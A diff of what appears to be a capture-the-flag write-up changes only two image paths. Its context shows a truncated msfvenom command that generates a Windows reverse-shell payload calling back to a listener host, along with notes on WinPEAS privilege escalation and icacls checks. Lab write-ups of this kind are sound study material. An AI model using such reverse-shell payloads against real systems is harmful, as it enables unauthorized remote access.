@@ -28,7 +28,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.5
 
 Then, we can run the script and a shell would pop on our listener port.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -40,7 +40,7 @@ When I ran WinPEASx64 on this machine, there was a lot of indication that we had
 
 However, we cannot read the root flag for some reason.
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>
 
 We can check the permissions using `icacls`.&#x20;
 
